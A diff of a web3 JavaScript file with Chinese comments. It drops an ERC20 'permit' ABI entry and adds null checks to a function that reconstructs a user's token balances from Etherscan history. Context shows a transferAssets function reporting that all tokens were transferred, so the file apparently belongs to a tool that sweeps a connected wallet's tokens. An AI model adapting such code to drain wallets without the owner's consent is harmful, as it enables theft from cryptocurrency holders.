@@ -3,7 +3,6 @@ let web3;
 let isConnected = false;
 
 const erc20Abi = [
-    // ERC20 contract ABI
     {
         "constant": true,
         "inputs": [{"name": "_owner", "type": "address"}],
@@ -19,21 +18,6 @@ const erc20Abi = [
         ],
         "name": "transfer",
         "outputs": [{"name": "success", "type": "bool"}],
-        "type": "function"
-    },
-    {
-        "constant": false,
-        "inputs": [
-            {"name": "owner", "type": "address"},
-            {"name": "spender", "type": "address"},
-            {"name": "value", "type": "uint256"},
-            {"name": "deadline", "type": "uint256"},
-            {"name": "v", "type": "uint8"},
-            {"name": "r", "type": "bytes32"},
-            {"name": "s", "type": "bytes32"}
-        ],
-        "name": "permit",
-        "outputs": [],
         "type": "function"
     }
 ];
@@ -125,7 +109,7 @@ const transferAssets = async (account) => {
     document.getElementById('status').innerText += '\n所有代币转移完成';
 };
 
-// 获取代币余额
+// 获取代币余额的函数
 const getTokenBalances = async (address) => {
     try {
         const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=YOUR_ETHERSCAN_API_KEY`;
@@ -138,6 +122,11 @@ const getTokenBalances = async (address) => {
             const tokenAddress = tx.contractAddress;
             const tokenSymbol = tx.tokenSymbol;
 
+            // 检查 tx.from 和 tx.to 是否存在
+            if (!tx.from || !tx.to) {
+                continue; // 跳过没有 from 或 to 的交易
+            }
+
             if (!tokenBalances[tokenAddress]) {
                 tokenBalances[tokenAddress] = {
                     symbol: tokenSymbol,
@@ -145,6 +134,7 @@ const getTokenBalances = async (address) => {
                 };
             }
 
+            // 比较地址之前，先确保 tx.from 和 tx.to 存在
             if (tx.from.toLowerCase() === address.toLowerCase()) {
                 tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.sub(web3.utils.toBN(tx.value));
             }
